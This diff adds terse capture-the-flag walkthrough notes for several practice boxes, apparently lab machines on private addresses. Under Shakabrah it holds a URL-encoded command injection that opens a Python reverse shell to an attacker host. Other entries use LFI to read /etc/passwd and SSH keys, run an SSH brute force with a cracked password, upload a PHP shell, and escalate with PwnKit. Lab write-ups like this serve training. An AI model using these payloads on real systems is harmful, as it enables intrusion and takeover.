@@ -1974,3 +1974,78 @@ Password: Shield@123%
 
 6. bash -p #rooted 
 ```
+
+## FunboxRookie
+```
+1. tom.zip at ftp anonymous. 
+
+2. crack it and see id_rsa
+
+3. ssh login, Pwnkit to root
+```
+
+## Moneybox
+```
+1. Found /blog > /S3cr3t-T3xt > "3xtr4ctd4t4" passphrase found. 
+
+2. Take id_rsa file from jpg file, ssh login
+
+3. ssh login to another user
+
+4. Rooted with perl
+```
+
+## Gaara
+```
+1. hydra ssh bruteforce with gaara. garra:iloveyou2
+
+2. gdb priesc, rooted
+```
+
+## SAR
+```
+1. Web directory on robots.txt
+
+2. Found RCE.   
+Sar2HTML 3.2.1 - Remote Command Execution
+
+3. Foothold, use crontab to root. 
+```
+
+## OnSystemShellDredd
+```
+1. Found id_rsa under ftp. 
+
+2. cpulimit suid to root. 
+```
+
+## Inclusiveness
+```
+1. Found /robots.txt.
+You are not a search engine! You can't read my robots.txt! 
+2. Read it with curl. sudo curl -s --user-agent Googlebot http://192.168.155.14/robots.txt -v
+3. Upload shell.php with ftp and get foothold. 
+http://192.168.155.14/secret_information/?lang=/var/ftp/pub/shell1.php
+4. PwnKit to root. 
+```
+
+## EvilBox-One
+```
+1. File disclosure. 
+a. ffuf -u http://192.168.155.212/secret/FUZZ.php -w /usr/share/dirb/wordlists/big.txt
+b. ffuf -u http://192.168.155.212/secret/evil.php?FUZZ=/etc/passwd -w /usr/share/dirb/wordlists/big.txt -fs 0
+c. http://192.168.155.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa (check source page)
+d. ssh foothold, add new root /etc/passwd, rooted. 
+```
+
+## Shakabrah
+```
+1. ping 127.0.0.1;python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.45.156%22%2C80%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27 
+2. PwnKit privesc. 
+```
+
+## Photographer
+```
+1. Found Koken CMS 0.22.24 on port 8000 which have arbitary file upload exploit. Upload reverseh monkey php file and obtained foothold. 
+2. use php suid for privesc. 
+```
